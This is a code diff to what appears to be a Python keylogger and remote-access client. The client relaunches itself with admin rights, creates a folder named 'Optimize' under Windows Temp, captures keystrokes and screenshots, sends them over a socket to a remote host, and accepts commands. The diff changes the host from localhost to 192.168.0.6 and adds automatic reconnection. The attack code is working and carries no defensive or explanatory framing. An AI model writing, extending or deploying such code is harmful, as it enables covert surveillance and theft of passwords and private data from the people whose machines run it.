@@ -29,7 +29,7 @@ def relaunch_as_admin():
 if not is_admin():
     relaunch_as_admin()
 os.makedirs(r"C:\Windows\Temp\Optimize", exist_ok=True)
-HOST = "127.0.0.1"
+HOST = "192.168.0.6"
 PORT = 5001
 while True:
     try:
@@ -41,6 +41,17 @@ while True:
     except Exception as e:
         print("Retrying:", e)
         time.sleep(1)  # <-- CRITICAL
+def restart():
+    while True:
+        try:
+            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client.connect((HOST, PORT))
+            print("Connected!")
+            client.sendall(b"hello")   # <-- IMPORTANT
+            break
+        except Exception as e:
+            print("Retrying:", e)
+            time.sleep(1)  # <-- CRITICAL
 def on_press(key):
     try:
         print(f'Key pressed: {key.char}')
@@ -48,6 +59,8 @@ def on_press(key):
     except AttributeError:
         print(f'Special key pressed: {key}')
         client.sendall(b"key," + str(key).encode("utf-8"))
+    except:
+        restart()
 
 def on_release(key):
     pass
@@ -83,6 +96,7 @@ def take_screenshot():
             client.sendall(data)
         except Exception as e:
             print("Error:", e)
+            restart()
         time.sleep(2)
 def receive_commands():
     while True:
@@ -111,13 +125,4 @@ try:
     while True:
         time.sleep(1)
 except:
-    while True:
-        try:
-            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client.connect((HOST, PORT))
-            print("Connected!")
-            client.sendall(b"hello")   # <-- IMPORTANT
-            break
-        except Exception as e:
-            print("Retrying:", e)
-            time.sleep(1)  # <-- CRITICAL
+    restart()
